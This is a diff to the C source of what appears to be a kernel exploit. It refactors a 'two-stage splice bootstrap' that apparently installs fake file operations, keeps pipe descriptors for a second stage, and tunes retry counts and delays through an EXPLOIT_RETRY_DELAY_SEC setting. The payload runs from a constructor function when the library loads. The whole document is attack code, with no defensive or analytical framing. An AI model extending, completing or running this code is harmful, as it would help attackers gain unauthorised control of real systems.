@@ -14,7 +14,7 @@
 #ifndef DEFAULT_P0_ATTEMPT_TIMEOUT_SEC
 #define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 20
 #endif
-#define APP_MIN_BOOT_UPTIME_SEC 120
+#define APP_MIN_BOOT_UPTIME_SEC 60
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 struct app_p0_shared_state {
@@ -37,6 +37,8 @@ struct app_p0_shared_state {
 };
 
 static struct app_p0_shared_state *app_p0_state;
+static int app_two_stage_data_write_fd = -1;
+static int app_two_stage_result_read_fd = -1;
 
 void app_publish_p0_offset(uintptr_t offset) {
   if (!app_p0_state) {
@@ -77,6 +79,28 @@ void app_publish_two_stage1(uintptr_t installed_fops,
 
 void app_publish_two_stage2_ready(void) {
   if (app_p0_state) atomic_store(&app_p0_state->two_stage2_ready, 1);
+}
+
+int app_trigger_two_stage_splice(void) {
+  if (!app_p0_state || app_two_stage_data_write_fd < 0 ||
+      app_two_stage_result_read_fd < 0) {
+    return 0;
+  }
+  uint64_t desired = app_p0_state->two_stage_bootstrap_flags_mode;
+  ssize_t put = write(app_two_stage_data_write_fd, &desired,
+                      sizeof(desired));
+  ssize_t splice_ret = -1;
+  ssize_t got = read(app_two_stage_result_read_fd, &splice_ret,
+                     sizeof(splice_ret));
+  if (put != (ssize_t)sizeof(desired) ||
+      got != (ssize_t)sizeof(splice_ret)) {
+    splice_ret = -1;
+  }
+  atomic_store(&app_p0_state->two_stage_splice_ret, splice_ret);
+  atomic_store(&app_p0_state->two_stage_splice_done, 1);
+  pr_info("two-stage direct splice bootstrap put=%zd got=%zd ret=%zd\n",
+          put, got, splice_ret);
+  return splice_ret == (ssize_t)sizeof(uint64_t);
 }
 
 int app_wait_two_stage_splice(ssize_t *splice_ret) {
@@ -125,6 +149,7 @@ void app_publish_two_stage1(uintptr_t installed_fops,
   (void)bootstrap_flags_mode;
 }
 void app_publish_two_stage2_ready(void) {}
+int app_trigger_two_stage_splice(void) { return 0; }
 int app_wait_two_stage_splice(ssize_t *splice_ret) {
   (void)splice_ret;
   return 0;
@@ -157,6 +182,7 @@ void app_publish_two_stage1(uintptr_t installed_fops,
   (void)bootstrap_flags_mode;
 }
 void app_publish_two_stage2_ready(void) {}
+int app_trigger_two_stage_splice(void) { return 0; }
 int app_wait_two_stage_splice(ssize_t *splice_ret) {
   (void)splice_ret;
   return 0;
@@ -604,24 +630,6 @@ __attribute__((constructor)) static void load(void) {
                    child);
         break;
       }
-      if (getenv("PSELECT_TWO_STAGE2") &&
-          atomic_load(&app_p0_state->two_stage2_ready) &&
-          !atomic_load(&app_p0_state->two_stage_splice_done)) {
-        uint64_t desired = app_p0_state->two_stage_bootstrap_flags_mode;
-        ssize_t put = write(two_stage_data_pipe[1], &desired,
-                            sizeof(desired));
-        ssize_t splice_ret = -1;
-        ssize_t got = read(two_stage_result_pipe[0], &splice_ret,
-                           sizeof(splice_ret));
-        if (put != (ssize_t)sizeof(desired) ||
-            got != (ssize_t)sizeof(splice_ret)) {
-          splice_ret = -1;
-        }
-        atomic_store(&app_p0_state->two_stage_splice_ret, splice_ret);
-        atomic_store(&app_p0_state->two_stage_splice_done, 1);
-        pr_info("two-stage splice bootstrap put=%zd got=%zd ret=%zd\n",
-                put, got, splice_ret);
-      }
 #endif
 
       struct timespec now;
@@ -675,6 +683,8 @@ __attribute__((constructor)) static void load(void) {
       }
       close(two_stage_data_pipe[0]);
       close(two_stage_result_pipe[1]);
+      app_two_stage_data_write_fd = two_stage_data_pipe[1];
+      app_two_stage_result_read_fd = two_stage_result_pipe[0];
       usleep(300000);
       int splice_status = 0;
       if (two_stage_splice_child < 0 ||
@@ -699,9 +709,14 @@ __attribute__((constructor)) static void load(void) {
       SYSCHK(setenv("OLD_FILETARGET_INSTALLED_FAKE_FOPS",
                     installed_arg, 1));
       SYSCHK(setenv("PSELECT_TWO_STAGE2", "1", 1));
+      int stage2_attempts = env_int(
+          "TWO_STAGE2_ATTEMPTS", 12, 1, 32);
+      max_attempts = attempt + stage2_attempts;
       pr_success("two-stage splice blocked pid=%d mode_target=%016zx "
-                 "delta=%" PRIdPTR " installed_fops=%s\n",
-                 two_stage_splice_child, mode_target, delta, installed_arg);
+                 "delta=%" PRIdPTR " installed_fops=%s "
+                 "stage2_attempts=%d total_limit=%d\n",
+                 two_stage_splice_child, mode_target, delta, installed_arg,
+                 stage2_attempts, max_attempts);
       continue;
 #endif
     }
@@ -770,8 +785,9 @@ __attribute__((constructor)) static void load(void) {
     }
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
     if (attempt < max_attempts) {
-      pr_info("safe retry quiet delay seconds=5\n");
-      sleep(5);
+      int retry_delay = env_int("EXPLOIT_RETRY_DELAY_SEC", 0, 0, 10);
+      pr_info("safe retry quiet delay seconds=%d\n", retry_delay);
+      sleep((unsigned int)retry_delay);
     }
 #endif
   }
